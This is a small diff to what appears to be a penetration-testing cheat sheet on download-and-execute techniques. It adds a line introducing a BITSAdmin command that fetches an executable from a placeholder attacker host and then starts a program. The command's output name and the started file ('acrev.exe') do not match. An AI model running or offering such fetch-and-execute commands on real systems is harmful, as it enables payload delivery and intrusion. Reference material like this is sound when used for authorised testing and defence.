@@ -23,6 +23,8 @@ Powershell Download and Execute script with execution bypass and Powershell Vers
 
 ### BITS Admin
 
+BITSAdmin can also be used to transfer files to a host with the following command: 
+
 `cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://<ip address>:<port>/FileToTransfer.exe C:\Path\ExeOutputName.exe & start acrev.exe"`
 
 
